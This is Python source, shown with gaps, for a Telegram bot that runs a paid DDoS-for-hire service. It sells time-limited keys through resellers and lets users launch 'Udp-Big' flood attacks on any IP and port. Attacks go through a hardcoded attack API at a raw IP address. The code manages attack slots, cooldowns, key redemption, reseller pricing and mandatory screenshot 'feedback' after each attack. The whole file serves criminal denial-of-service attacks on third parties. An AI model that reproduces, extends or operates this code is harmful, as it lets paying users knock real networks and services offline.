...
API_BASE_URL = "http://13.232.68.73:3938/attack"  # Your API base URL
...
if not BOT_TOKEN:
    print("⚠️ ERROR: BOT_TOKEN is empty! Please set your bot token.")
    exit(1)
if not BOT_OWNER:
    print("⚠️ WARNING: BOT_OWNER list is empty! No owner commands will work.")
if not API_BASE_URL or not API_KEY:
    print("⚠️ WARNING: API_BASE_URL or API_KEY is empty! Real attacks will fail.")

bot = telebot.TeleBot(BOT_TOKEN) if BOT_TOKEN else None

# ============ GLOBAL INLINE KEYBOARD ============
...
def pe(emoji):
    """Emoji ko premium tag me convert karta hai"""
...
def send_real_attack(target, port, duration, concurrent_val):
    ...
    """ Send nuclear attack via API Endpoint """
    ...
    try:
        ...
        print(f"⚠️ [ATTACK] Timeout for {target}:{port}")
        return "TIMEOUT"
    except requests.exceptions.ConnectionError:
        print(f"⛔ [ATTACK] Connection Error for {target}:{port}")
        return "CONNECTION_ERROR"
    except Exception as e:
        print(f"⚠️ [ATTACK] Exception: {e}")
        return "ERROR"
...
def build_attack_start_message(target, port, duration, cooldown):
    return f'''{pe("⚡")} <b>ATTACK STARTED</b> {pe("⚡")}

{pe("🎯")} <b>Target:</b> {target}:{port}
{pe("🕐")} <b>Duration:</b> {duration} seconds
{pe("🔥")} <b>Method:</b> Udp-Big
{pe("🌍")} <b>Location:</b> Global
{pe("🕐")} <b>Cooldown:</b> {cooldown} seconds

{pe("📊")} <b>Use /status to check attack progress</b>
'''

def build_attack_complete_message(target, port, duration):
    return f'''{pe("✅")} <b>ATTACK COMPLETE</b> {pe("✅")}

{pe("🎯")} <b>Target:</b> {target}:{port}
{pe("🕐")} <b>Duration:</b> {duration} seconds
{pe("🆔")} <b>Attack ID:</b> a662e212-a0ef-4656
{pe("🎉")} <b>Slots:</b> #1 Finished!
'''

def build_feedback_required_message():
    return f'''{pe("📸")} <b>FEEDBACK REQUIRED</b> {pe("📸")}
...
def handle_attack(message):
    ...
    if is_group:
        ...
        if not is_approved:
            safe_send_message(message.chat.id, f'{pe("⚠")} <b>THIS GROUP IS NOT APPROVED FOR ATTACK</b>\n\n{pe("📞")} Contact the bot owner to get this group approved.', reply_to=message, parse_mode="HTML")
            return
        
        group_cooldown = get_group_cooldown(group_id)
        if group_cooldown > 0:
            safe_send_message(message.chat.id, f'{pe("🕐")} <b>Group cooldown active!</b> Wait: {group_cooldown}s', reply_to=message, parse_mode="HTML")
            return
        ...
        with _attack_lock:
            ...
            if used_in_group >= group_max_slots:
                safe_send_message(message.chat.id, f'{pe("❌")} <b>Group max slots reached!</b> Only {group_max_slots} simultaneous attacks allowed in this group.', reply_to=message, parse_mode="HTML")
                return
    ...
    if not is_group:
        ...
        if not has_valid_key(user_id):
            ...
            if user and user.get('reseller_username'):
                safe_send_message(message.chat.id, f'{pe("❌")} <b>Key expired!</b>\n\n{pe("🔄")} For renewal DM: @{user.get("reseller_username")}', reply_to=message, parse_mode="HTML")
            else:
                safe_send_message(message.chat.id, f'{pe("❌")} <b>You don\'t have a valid key!</b>\n\n{pe("🔑")} Contact a reseller to purchase a key.', reply_to=message, parse_mode="HTML")
            return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        msg = f'{pe("🚀")} <b>ATTACK COMMAND FORMAT</b> {pe("🚀")}\n\n'
        msg += f'{pe("⚠")} Usage: /attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;\n\n'
        msg += f'{pe("📝")} Example:\n• /attack 127.0.0.1 8080 60\n\n'
        msg += f'{pe("⛔")} Limits:\n• Security: Online\n• Blocked ports: 443, 8700, 9031, 17500, 20000, 20001, 20002\n\n'
        msg += f'{pe("💡")} Real-time progress will be shown!'
        safe_send_message(message.chat.id, msg, reply_to=message, parse_mode="HTML")
        return
    ...
    if is_attacking:
        ...
        safe_send_message(message.chat.id, f'{pe("❌")} <b>Port {port} is already being attacked on {target}!</b>\n\n{pe("🕐")} Time remaining: {remaining}s\n\nPlease wait for the current attack to finish.', reply_to=message, parse_mode="HTML")
        return

    if not validate_target(target):
        safe_send_message(message.chat.id, f'{pe("❌")} <b>Invalid IP!</b>', reply_to=message, parse_mode="HTML")
        return
    
    if is_ip_blocked(target):
        safe_send_message(message.chat.id, f'{pe("🚫")} <b>IP {target} is blocked!</b> Use another IP.', reply_to=message, parse_mode="HTML")
        return
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            safe_send_message(message.chat.id, f'{pe("❌")} <b>Invalid port!</b> (1-65535)', reply_to=message, parse_mode="HTML")
            return
        duration = int(duration)
        
        if duration < MIN_ATTACK_TIME and not is_owner(user_id):
            safe_send_message(message.chat.id, f'{pe("❌")} <b>Minimum attack time is {MIN_ATTACK_TIME} seconds!</b>', reply_to=message, parse_mode="HTML")
            return
        ...
        if not is_owner(user_id) and duration > max_time:
            if not is_group:
                safe_send_message(message.chat.id, f'{pe("❌")} <b>Your {key_type} key allows max {max_time}s attack time!</b>', reply_to=message, parse_mode="HTML")
            else:
                safe_send_message(message.chat.id, f'{pe("❌")} <b>Max time for this group: {max_time}s</b>', reply_to=message, parse_mode="HTML")
            return
        ...
        if slot_index is None:
            ...
            safe_send_message(message.chat.id, f'{pe("❌")} <b>Max attack limit reached!</b> All {total_slots} slots are busy.\n\nPlease try again later.', reply_to=message, parse_mode="HTML")
            return
        ...
        safe_send_message(message.chat.id, f'{pe("❌")} <b>Port and time must be numbers!</b>', reply_to=message, parse_mode="HTML")
    ...
    try:
        ...
        def finish_attack():
            ...
            if feedback_required:
                ...
                safe_send_message(message.chat.id, f'{pe("✅")} <b>You can now start a new attack using /attack command.</b>', reply_to=message, parse_mode="HTML")
...
def redeem_key_command(message):
    ...
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, f'{pe("⚠")} Usage: /redeem &lt;key&gt;', reply_to=message, parse_mode="HTML")
        return
    ...
    if not key_doc:
        safe_send_message(message.chat.id, f'{pe("❌")} <b>This is nvalid key!</b>', reply_to=message, parse_mode="HTML")
        return
    ...
    if key_doc['used'] and current_users >= max_users:
        safe_send_message(message.chat.id, f'{pe("❌")} <b>This key has already been used!</b>', reply_to=message, parse_mode="HTML")
        return
    ...
    if key_doc.get('is_trail'):
        ...
        if user_data and user_data.get('key_expiry') and user_data['key_expiry'] > datetime.now():
            ...
            if abuse_count == 1:
                safe_send_message(message.chat.id, f'{pe("⚠️")} <b>Warning: You cannot extend your time with a trail key!</b> Another attempt may result in a ban.', reply_to=message, parse_mode="HTML")
            else:
                ...
                safe_send_message(message.chat.id, f'{pe("🚫")} <b>You have been banned for {ban_minutes} minutes due to trail key abuse!</b>', reply_to=message, parse_mode="HTML")
            return
    ...
    if user and user.get('key_expiry') and user['key_expiry'] > datetime.now():
        ...
        safe_send_message(message.chat.id, f'{pe("✅")} <b>Key Extended!</b>\n\n{pe("🔑")} Key: <code>{key_input}</code>\n{pe("⭐")} Type: {key_type}\n{pe("🕐")} Added: {key_doc["duration_label"]}\n{pe("🕐")} Total Time: {new_remaining}\n{pe("⚡")} Max Attack: {max_attack_time}s', reply_to=message, parse_mode="HTML")
    else:
        ...
        safe_send_message(message.chat.id, f'{pe("✅")} <b>Key Redeemed!</b>\n\n{pe("🔑")} Key: <code>{key_input}</code>\n{pe("⭐")} Type: {key_type}\n{pe("🕐")} Duration: {key_doc["duration_label"]}\n{pe("🕐")} Time Left: {remaining}\n{pe("⚡")} Max Attack: {max_attack_time}s', reply_to=message, parse_mode="HTML")
...
# ============================================================
# ✅ MODIFIED STATUS COMMAND - AUTO UPDATES EVERY 5 SECONDS
# ============================================================
...
def status_command(message):
    ...
    status_msg = safe_send_message(message.chat.id, "🔄 Fetching live status.....", reply_to=message)
    ...
    def update_status():
        try:
            ...
            response = "╔═════════════════════════╗\n"
            response += f"║     {pe('🔥')} <b>ATTACK STATUS</b> {pe('🔥')}\n"
            response += "╠═════════════════════════╣\n"
            
            if active_attacks_list:
                response += f"║  {pe('⚔️')} <b>Active Attacks:</b> {len(active_attacks_list)}/{total_slots}\n"
                response += "╠═════════════════════════╣\n"
                for i, attack in enumerate(active_attacks_list, 1):
                    ...
                    response += f"║  {i}. {pe('🎯')} {target_display}\n"
                    response += f"║     {pe('🕐')} Time left: {attack['remaining']}s  [{progress_bar}] {attack['percentage']}%\n"
                    if i < len(active_attacks_list):
                        response += "║  ─────────────────────────\n"
            else:
                response += f"║  {pe('💤')} <b>No active attack</b>\n"
            
            response += "╠═════════════════════════╣\n"
            response += f"║  {pe('🟢')} <b>Free Slots:</b> {free_slots}/{total_slots}\n"
            response += f"║  {pe('🔴')} <b>Used Slots:</b> {busy_slots}/{total_slots}\n"
            response += "╚═════════════════════════╝\n"
            response += f"\n{pe('👥')} <b>Active Groups:</b> {active_groups}\n"
            response += f"{pe('👤')} <b>Private Users:</b> {private_users}\n"
            response += f"{pe('🚫')} <b>Blocked IPs:</b> {blocked_ips_count}\n"
            response += f"{pe('⚙')} <b>Max Time:</b> {get_max_attack_time()}s\n"
            response += f"{pe('⚡')} <b>Concurrent/Attack:</b> {get_concurrent_limit()}"
            ...
            # ✅ Sirf active attack ke time update
            with _attack_lock:
                has_active = False
                for attack in active_attacks.values():
                    if attack['end_time'] > datetime.now():
...
def my_access_command(message):
    ...
    if not user or not user.get('key'):
        safe_send_message(message.chat.id, f'{pe("❌")} <b>You don\'t have any active access!</b>', reply_to=message, parse_mode="HTML")
        return
    
    if not has_valid_key(user_id):
        safe_send_message(message.chat.id, f'{pe("❌")} <b>Your access has expired!</b>', reply_to=message, parse_mode="HTML")
        return
    ...
    access_msg = f'{pe("📋")} <b>Your Access Details</b>\n\n'
    access_msg += f'{pe("🔑")} Key: <code>{user["key"]}</code>\n'
    access_msg += f'{pe("⭐")} Type: {key_type}\n'
    access_msg += f'{pe("🕐")} Time Left: {remaining}\n'
    access_msg += f'{pe("⚡")} Max Attack: {max_attack}s\n'
    access_msg += f'{pe("💼")} Reseller: @{reseller_name}\n'
    access_msg += f'{pe("✅")} Status: Active'
    
    safe_send_message(message.chat.id, access_msg, reply_to=message, parse_mode="HTML")
...
def handle_feedback_photo(message):
    ...
    safe_send_message(message.chat.id, 
        f'{pe("✅")} <b>Feedback Received!</b>\n\n'
        f'{pe("🎉")} Thank you for your feedback!\n\n'
        f'{pe("⚡")} <b>You can now start a new attack using /attack command.</b>',
    ...
    if BOT_OWNER:
        try:
            owner_msg = (
                f'{pe("📸")} <b>NEW ATTACK FEEDBACK</b>\n\n'
                f'{pe("👤")} <b>User:</b> {user_name}\n'
                f'{pe("📛")} <b>Username:</b> @{username if username else "N/A"}\n'
                f'{pe("🆔")} <b>ID:</b> <code>{user_id}</code>\n'
                f'{pe("📍")} <b>Location:</b> {location}\n'
                f'{pe("📊")} <b>Type:</b> {attack_type}\n\n'
                f'{pe("🎯")} <b>Target:</b> {fb["target"]}:{fb["port"]}\n'
                f'{pe("🕐")} <b>Duration:</b> {fb["duration"]}s\n'
                f'{pe("🕐")} <b>Time:</b> {datetime.now().strftime("%d-%m-%Y %H:%M:%S")}'
            )
...
def show_help(message):
    ...
    if is_owner(user_id):
        help_text = f'''{pe("👑")} <b>OWNER HELP</b> {pe("👑")}

{pe("🔸")} /attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - Launch attack
{pe("🔸")} /status - Check attack status
{pe("🔸")} /cancel - Cancel active attack
{pe("🔸")} /redeem &lt;key&gt; - Redeem a key
{pe("🔸")} /myaccess - Check your access
{pe("🔸")} /id - Get your ID
{pe("🔸")} /ping - Show bot latency
'''
    elif is_reseller(user_id):
        help_text = f'''{pe("💼")} <b>RESELLER HELP</b> {pe("💼")}
...
{pe("🔸")} /id - Get your ID
{pe("🔸")} /ping - Show bot latency
{pe("🔸")} /mysaldo - Check your balance
{pe("🔸")} /prices - View key prices
{pe("🔸")} /gen - Generate keys
'''
    else:
        help_text = f'''{pe("📚")} <b>AVAILABLE COMMANDS</b> {pe("📚")}

{pe("🔸")} /start - Start interacting with the bot
{pe("🔸")} /attack &lt;ip&gt; &lt;port&gt; &lt;duration&gt; - Launch attack
{pe("🔸")} /redeem &lt;key&gt; - Redeem a key
{pe("🔸")} /status - Check attack status
{pe("🔸")} /cancel - Cancel active attack
...
{pe("📸")} Feedback Required: After each attack, you must send a screenshot to continue.
'''
    
    safe_send_message(message.chat.id, help_text, reply_to=message, parse_mode="HTML")
...
def welcome_start(message):
    ...
    if is_owner(user_id):
        response = f'''{pe("👑")} <b>Welcome Owner, {user_name}!</b> {pe("👑")}

• Use /owner to see all commands or /config for interactive panel.
• Use /help to see basic commands.'''
    elif is_reseller(user_id):
        response = f'''{pe("💼")} <b>Welcome Reseller, {user_name}!</b> {pe("💼")}

• Use /help to see your commands.'''
    else:
        response = f'''{pe("👋")} <b>Welcome, {user_name}!</b> {pe("👋")}

{pe("🔥")} Here are the commands you can use:
...
def id_command(message):
    if check_banned(message): return
    user_id = message.from_user.id
    safe_send_message(message.chat.id, f'{pe("🆔")} <b>Your ID:</b> <code>{user_id}</code>', reply_to=message, parse_mode="HTML")
...
def ping_command(message):
    ...
    response = f'{pe("🏓")} <b>Bot Pong!</b>\n\n'
    response += f'{pe("⚡")} <b>Response Time:</b> {response_time}ms\n'
    response += f'{pe("⚔")} <b>Active Attacks:</b> {busy_slots}/{total_slots}\n'
    response += f'{pe("👥")} <b>Active Groups:</b> {active_groups}\n'
    response += f'{pe("👤")} <b>Private Users:</b> {private_users}\n'
    response += f'{pe("🚫")} <b>Blocked IPs:</b> {blocked_ips_count}\n'
    response += f'{pe("🔒")} <b>Maintenance Mode:</b> {maintenance_status}\n'
    response += f'{pe("🕐")} <b>Uptime:</b> {uptime_str}'
